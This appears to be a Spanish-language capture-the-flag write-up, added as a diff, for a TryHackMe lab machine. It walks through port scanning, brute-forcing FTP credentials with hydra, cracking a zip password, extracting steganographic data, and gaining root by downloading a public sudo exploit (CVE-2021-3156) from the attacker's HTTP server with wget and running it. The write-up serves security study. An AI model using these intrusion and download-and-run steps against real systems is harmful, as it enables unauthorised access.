@@ -1,0 +1,98 @@
+TryHackMe
+angent-sudo
+
+nmap:
+
+    nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn 10.10.44.181 -oN nmap
+
+    • 21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
+    • 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+    • 80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
+
+Al abrir el puerto 80, vemos una pista que indica "user agent", por lo tanto, abrimos Burp Suite para buscar más pistas. Después de cambiar "user agent" a "C", vemos una nueva ventana que indica un posible usuario: "chris".
+
+Luego, intentamos una fuerza bruta en el puerto ssh e intentamos ingresar:
+
+    hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.44.181 -t 4
+    21][ftp] host: 10.10.44.181   login: chris   password: crystal
+
+Con las credenciales del servidor SSH, podemos ingresar. Dentro encontramos imágenes y un archivo .txt:
+
+• cute-alien.jpg
+• cutie.png
+• To_agentJ.txt
+
+Dentro de "To_agentJ.txt" encontramos una pista de que la respuesta está dentro de las imágenes.
+
+Utilizamos "binwalk" para ver qué hay en las imágenes:
+
+    binwalk cutie.png
+
+Al extraer el archivo:
+
+    foremost -i cutie.png
+    cd output
+    audit.txt
+    png
+    zip
+
+Dentro de "zip", vemos otro archivo comprimido. Para abrirlo, necesitamos una contraseña. Utilizamos John the Ripper:
+
+    zip2john 00000067.zip > hash
+    john --wordlist=/usr/share/wordlists/rockyou.txt hash
+    alien (00000067.zip/To_agentR.txt)
+
+Extraemos el interior del archivo zip:
+
+    7z e 00000067.zip
+    pass: alien
+
+Ahora tenemos el archivo "To_agentR.txt". Dentro encontramos una posible contraseña codificada en base64 "QXJlYTUx" para el agente R.
+
+Procedemos a extraer la información de la próxima imagen utilizando "steghide":
+
+    steghide --extract -sf cute-alien.jpg
+    password: QXJlYTUx
+
+No es la contraseña correcta. Al analizar el pass, deducimos que posiblemente esté en base64:
+
+    echo 'QXJlYTUx' | base64 -d
+    Area51
+
+Extraemos "message.txt" de la imagen:
+
+    steghide --extract -sf cute-alien.jpg
+    password: Area51
+    extraemos message.txt
+
+Dentro de message.txt encontramos que el agente "james" tiene la contraseña "hackerrules!". Intentamos acceder al puerto SSH con estas credenciales:
+
+    ssh james@10.10.10.179
+    pass: hackerrules!
+
+Estamos dentro. Al ingresar, encontramos la bandera de usuario:
+
+    cat user_flag.txt
+    b03d975e8c92a7c04146cfa7a5a313c7
+
+El agente james tiene permisos para todos los comandos, pero no podemos acceder a root, así que debemos escalar privilegios.
+
+    sudo -V
+    Sudo version 1.8.21p2
+
+Buscamos un exploit para esa versión y encontramos:
+
+    https://github.com/worawit/CVE-2021-3156
+
+Para que funcione, necesitamos el exploit "exploit_nss.py".
+
+Luego de descargarlo con git clone, procedemos a subir ese archivo al servidor SSH:
+
+    python3 -m http.server 8080
+    wget 10.18.112.21:8080/exploit_nss.py
+    python3 exploit_nss.py
+
+Ahora somos root:
+
+    cat root.txt
+    b53a02f55b57d4439e3341834d70c062
